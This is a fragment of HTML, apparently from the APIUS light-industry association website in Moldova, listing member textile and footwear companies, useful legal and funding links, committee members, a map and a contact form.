class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="420" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Portavita.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Portavita</p><p class="work-category normal no-margin">Portavita</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="418" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Premiera-Dona.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Premiera DONA</p><p class="work-category normal no-margin">Haine de dama</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="416" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Ravety.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ravetti</p><p class="work-category normal no-margin">Producator de lenjrie</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="414" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Secana.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Secana</p><p class="work-category normal no-margin">Haine de dama</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="412" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Special-Baby.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Special Baby</p><p class="work-category normal no-margin">Producator de lenjerie de pat</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="410" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Sram.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Shram</p><p class="work-category normal no-margin">Shram</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="408" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Steaua-Red.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Steaua Reds</p><p class="work-category normal no-margin">Steaua Reds</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="406" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Tabita.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tabita Com</p><p class="work-category normal no-margin">Tabita Com</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="404" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Tighina.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tighina</p><p class="work-category normal no-margin">Tighina</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  "><div class="work-inner"><!-- Image --><div class="work-image"><a href="402" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Tiras.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tiras</p><p class="work-category normal no-margin">Tiras</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="130" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Vestiti.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Vestiti</p><p class="work-category normal no-margin">Producatori haine copii</p><a href="http://apius.md/wp-content/uploads/2014/08/35.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="127" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Zorile.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Zorile</p><p class="work-category normal no-margin">Producator de incaltaminte</p><a href="http://apius.md/wp-content/uploads/2014/08/15.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  "><div class="work-inner"><!-- Image --><div class="work-image"><a href="125" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Ystill.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ystill</p><p class="work-category normal no-margin">Haine pentru copii</p><a href="http://apius.md/wp-content/uploads/2014/08/slide5.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="123" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Vistline.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Vistline</p><p class="work-category normal no-margin">Producator de Paltoane</p><a href="http://apius.md/wp-content/uploads/2014/08/15.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="119" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Tricon.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tricon</p><p class="work-category normal no-margin">Producator de tricotaje</p><a href="http://apius.md/wp-content/uploads/2014/08/slide5.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="116" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Vasconi.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Vasconi</p><p class="work-category normal no-margin">Tricotaje</p><a href="http://apius.md/wp-content/uploads/2014/08/slide5.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="113" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Vivi-Art.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">work image 7</p><p class="work-category normal no-margin">Producator haine copii</p><a href="http://apius.md/wp-content/uploads/2014/08/35.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="109" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Tititi-C.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tititi si C</p><p class="work-category normal no-margin">Tititi si C</p><a href="http://apius.md/wp-content/uploads/2014/08/slide5.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="258" class="expander"><img src="http://apius.md/wp-content/uploads/2014/08/Tirotex.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Tirotex</p><p class="work-category normal no-margin">Companie textila</p><a href="http://apius.md/wp-content/uploads/2014/08/slide22.jpg"  data-rel="prettyPhoto[gallery]" class="work-link" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div>      <!-- End Work -->
+      <!-- Clear -->
+      <div class="clear"></div>
+   </div>
+   <!-- End Works -->
+</section>
+<!-- End Porfolio Section -->
+	<!-- Why We Are -->
+	<section id="why-we" class="container parallax4 ff-background-size-cover ff-parallax " style="background: url('http://apius.md/wp-content/uploads/2014/08/i4.jpg') center center fixed;">
+
+		<!-- Inner -->
+		<div class="inner">
+
+			<!-- Left Area -->
+			<div class="col-xs-6 left animated" style="background-image:url('http://apius.md/wp-content/uploads/2014/08/iphone.png');" data-animation="fadeInLeft" data-animation-delay="300">
+				<div class="holder1" style="width:230px;top:22%;left:28%;"><a href="#" class="positive-m first-holder" data-toggle="tooltip" data-placement="top" title="Codul Muncii" ></a></div><div class="holder2" style="width:232px;top:39%;left:33%;"><a href="#" class="positive-m second-holder" data-toggle="tooltip" data-placement="right" title="Codul Vamal" ></a></div><div class="holder3" style="width:202px;top:51%;left:43%;"><a href="#" class="positive-m third-holder" data-toggle="tooltip" data-placement="bottom" title="Legea cu privire la Antreprenoriat" ></a></div><div class="holder2" style="width:230px;top:22%;left:28%;"><a href="#" class="positive-m second-holder" data-toggle="tooltip" data-placement="right" title="Legea cu privire la inregistratea persoanei juridice" ></a></div><div class="holder2" style="width:230px;top:22%;left:28%;"><a href="#" class="positive-m second-holder" data-toggle="tooltip" data-placement="right" title="Conținutul cu privire la Acordul de Asociere dintre RM si UE " ></a></div><div class="holder2" style="width:230px;top:22%;left:28%;"><a href="#" class="positive-m second-holder" data-toggle="tooltip" data-placement="right" title="Cum te pregăteşti de control de stat" ></a></div><div class="holder2" style="width:230px;top:22%;left:28%;"><a href="#" class="positive-m second-holder" data-toggle="tooltip" data-placement="right" title="Convenția cu privire la salarizarea angajaților cu  contract individual" ></a></div>
+			</div>
+
+			<!-- Right Accordion -->
+			<div class="col-xs-6 right accourdion-menu  ">
+
+			<!-- Detail -->
+			<h1 class="header normal dark t-left">Link-uri <span class="colored condiment bigger">utile</span></h1>
+
+			<!-- Description -->
+			<h4 class="h-desc t-left normal"></h4>
+
+
+				<!-- Accordion -->
+							 
+				<div class="accordion why-oxygen-accordion bold" id="acc-1">
+				
+					<!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-0"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Codul Muncii</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-0" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://lex.justice.md/md/326757/</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle  dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-1"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Codul Vamal</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-1" class="accordion-body collapse in"><!-- Inner --><div class="accordion-inner">http://lex.justice.md/index.php?action=view&view=doc&id=319745
+</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-2"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Legea cu privire la Antreprenoriat</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-2" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://lex.justice.md/viewdoc.php?id=311735&lang=1</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-3"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Legea cu privire la inregistratea persoanei juridice</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-3" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://lex.justice.md/md/326009/</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-4"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Conținutul cu privire la Acordul de Asociere dintre RM si UE</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-4" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://dcfta.md/continutul-acordului-de-asociere-dintre-rm-si-ue 
+ http://www.mec.gov.md/dcfta</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-5"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Convenția cu privire la salarizarea angajaților cu  contract individual:</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-5" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://lex.justice.md/index.php?action=view&view=doc&lang=1&id=285910</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-6"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Hotărârea cu privire la aprobarea nomenclatorului meseriilor</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-6" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://lex.justice.md/document_rom.php?id=8DE64946:06E07A2A</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-7"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Unitatea de Implementare a proiectului Băncii Mondiale de Ameliorare a Competitivității (UIPAC)</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-7" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://finantare.gov.md/ro/content/proiectul-ameiliorarea-competitivitatii-pac-2-componenta-de-granturi-de-cofinantare</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-8"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Programul Horiyon 2020 al Uniunii Europene</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-8" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://finantare.gov.md/ro/content/programul-horizon-2020-al-uniunii-europene </div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-9"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Banca Europeană pentru Reconstrucție și Dezvoltare, oficiul Chișinău</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-9" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://www.ebrd.com/work-with-us/advice-for-small-businesses/moldova.html</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-10"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Proiectul USAID</a></div><!-- End Heading --><!-- Details --><div id="coll-one1-10" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">https://www.usaid.gov/where-we-work/europe-and-eurasia/moldova</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-11"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Directoratul Liniei de Credit </a></div><!-- End Heading --><!-- Details --><div id="coll-one1-11" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">http://finantare.gov.md/ro/content/proiectul-de-ameliorare-competitivitatii-faza-ii-pac-2-linia-de-credit</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab --><!-- Accordion Tab --><div class="panel transparent"><!-- Heading --><div class="accordion-heading"><!-- Acordion Header --><a class="accordion-toggle collapsed dark" data-toggle="collapse" data-parent="#acc-1" href="#coll-one1-12"><!-- Header Icon --><!-- Header --><span class="positive-s"></span>Organizația pentru Dezvoltarea Întreprinderilor Mici și Mijlocii </a></div><!-- End Heading --><!-- Details --><div id="coll-one1-12" class="accordion-body collapse "><!-- Inner --><div class="accordion-inner">www.odimm.md</div><!-- End Inner --></div><!-- End Details --></div><!-- End Accordion Tab -->					
+				</div>
+				 
+				<!-- End Accordion Menu -->
+			</div><!-- End Right Div -->
+			<div class="clear"></div>
+		</div><!-- End Inner Div -->
+	</section><!-- End Why We Section -->
+<!-- Team -->
+<section id="team" class="container has-bg">
+	<!-- Team Inner -->
+	<div class="inner team">
+		<!-- Header -->
+		<h1 class="header light dark">Comitetul<span class="condiment">Apius </span> </h1>
+		<!-- Description -->
+		<h4 class="h-desc dark">Oamenii care isi aduc aportul si experienta lor pentru dezvoltarea  <span class="dark bold">APIUS</span> ca si organizatie lider pentru dezvoltarea Industriei Usoare</h4>
+		<!-- Members -->
+		<div class="team-members inner-details">
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Alexandra-Can-Artima-Presedinte.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Alexandra Can</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Presedinte</h4>
+							<!-- Description -->
+							<p class="member-description">Descriere Presedinte sau membru</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Tamara-Luchian-Ionel.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Tatiana Luchian</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Director "Ionel" SA</h4>
+							<!-- Description -->
+							<p class="member-description">Descriere memru comitet</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Iurie-Hanganu-Balteanca.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Iurie Hanganu</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Director Balteanca</h4>
+							<!-- Description -->
+							<p class="member-description">Descriere membru comitet</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Georgette.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Georgeta Mir</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Director Georgette</h4>
+							<!-- Description -->
+							<p class="member-description">Descriere membru comitet</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Vitalie-Burlacu.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Vitalie Burlacu</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Director "VB" </h4>
+							<!-- Description -->
+							<p class="member-description">Descriere membru comitet</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Member -->
+			<div class="col-xs-4 member animated" data-animation="fadeInUp" data-animation-delay="0">
+				<div class="member-inner">
+					<!-- Team Member Image -->
+					<a class="team-image">
+						<!-- Img -->
+						<img src="http://apius.md/wp-content/uploads/2014/08/Floare.jpg" alt="" />
+					</a>
+					<div class="member-details">
+						<div class="member-details-inner">
+							<!-- Name -->
+							<h2 class="member-name uppercase normal">Floare</h2>
+							<!-- Position -->
+							<h4 class="member-position uppercase normal">Director SA "Floare"</h4>
+							<!-- Description -->
+							<p class="member-description">Descriere membru comitet</p>
+							<!-- Socials -->
+							<div class="socials">
+							<a href="http://www.facebook.com/freshfacethemes"><i class="ff-font-awesome icon-facebook"></i></a><a href="http://www.twitter.com/_freshface"><i class="ff-font-awesome icon-twitter"></i></a><a href="http://instagram.com/"><i class="ff-font-awesome icon-instagram"></i></a><a href="http://www.tumblr.com/"><i class="ff-font-awesome icon-tumblr"></i></a>							
+						
+							</div>
+							<!-- End Socials -->
+						</div>
+						<!-- End Detail Inner -->
+					</div>
+					<!-- End Details -->
+				</div>
+				<!-- End Member Inner -->
+			</div>
+			<!-- End Member -->
+					<!-- Clear -->
+			<div class="clear"></div>
+		</div>
+		<!-- End Members -->
+	</div>
+	<!-- End Team Inner -->
+</section>
+<!-- End Team Section --><!-- Video -->
+<section id="video" class="pattern-black relative transparent">
+	<!-- Video Button -->
+	<a href="www.biblioteca-textila.apius.md" class="video-button t-center scroll">
+		<!-- Logo Span -->
+		<span class="logo-icon-m">
+			<!-- Your Logo -->
+			<img src="http://apius.md/wp-content/uploads/2014/08/logo1-1.png" alt="" />
+		</span>
+		<!-- Video Text -->
+		<p class="video-text uppercase condensed bold white">
+			Biblioteca textila		</p>
+	</a>
+	<!-- Video -->
+	
+			<!-- End Video -->
+	
+</section>
+<!-- End Video Section -->
+<!-- Google Map Section -->
+<section id="map" class="container close-map has-bg">
+	<!-- Open/Close Button -->
+	<a id="map-button" class="google-map-big-button uppercase bold condensed white scroll close-map-button" href="#map" >unde suntem ? click pentru google map <i class="ff-font-awesome icon-sort-down"></i></a>
+	<!-- Google Map Script -->
+	<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
+	<!-- Google Map -->
+	<div id="google-map"></div>
+	
+	<div class="ff-google-map-data" style="display:block;">
+		<div class="ff-map">
+			<input type="hidden" class="ff-latitude" value="47.063500"><input type="hidden" class="ff-longitude" value="28.870206"><input type="hidden" class="ff-zoom" value="15">		</div>
+		
+		<div class="ff-marker"><input type="hidden" class="ff-latitude" value="47.062797"><input type="hidden" class="ff-longitude" value="28.868852"><input type="hidden" class="ff-title" value="Office"><input type="hidden" class="ff-description" value="Your description is here."></div>	</div>
+</section>
+<!-- End Google Map Section -->
+<!-- Contact Section -->
+<section id="contact" class="container ff-background-size-cover parallax5 ff-parallax" style="background: url('http://apius.md/wp-content/uploads/2014/08/i5.jpg') center center fixed;">
+	<!-- Contact Inner -->
+	<div class="inner contact">
+		<!-- Header -->
+		<h1 class="header semibold white">Tine legatura cu <span class="extrabold">Noi</span></h1>
+		<!-- Description -->
+		<h4 class="h-desc white contact-text">On the other hand, we denounce with righteous indignation and dislike men who are so beguiled.</h4>
+		<!-- Form Area -->
+		<div class="contact-form">
+			<!-- Form -->
+			<form id="contact-us" method="post" action="/">
+				<!-- Left Inputs -->
+				<div class="col-xs-6 animated" data-animation="fadeInLeft" data-animation-delay="300">
+					<!-- Name -->
+					<input type="text" name="name" id="name"   class="form light requiredField ff-cf-name" placeholder="Nume" />
+					<!-- Email -->
+					<input type="email" name="mail" id="mail"  class="form light requiredField ff-cf-email" placeholder="Email" />
+					<!-- Subject -->
+					<input type="text" name="subject" id="subject"  class="form light requiredField ff-cf-subject" placeholder="Subiect" />
+				</div>
+				<!-- End Left Inputs -->
+				<!-- Right Inputs -->
+				<div class="col-xs-6 animated" data-animation="fadeInRight" data-animation-delay="300">
+					<!-- Message -->
+					<textarea name="message" id="message" class="form textarea light requiredField ff-cf-message"  placeholder="Mesaj"></textarea>
+				</div>
+				<!-- End Right Inputs -->
+				<!-- Bottom Submit -->
+				<div class="relative fullwidth col-xs-12">
+					<!-- Send Button -->
+					<button type="submit" id="submit" name="submit" class="form-btn light">trimite</button>
+				</div>
+				<!-- End Bottom Submit -->
+				<!-- Clear -->
+				<div class="clear"></div>
+			</form>
+			<!-- Your Mail Message -->
+			<div class="mail-message-area">
+				<!-- Message -->
+				<div class="alert gray-bg mail-message not-visible-message">
+					<strong>Multumim !</strong> Mesajul tau a fost livrat.				</div>
+			</div>
+			
+			
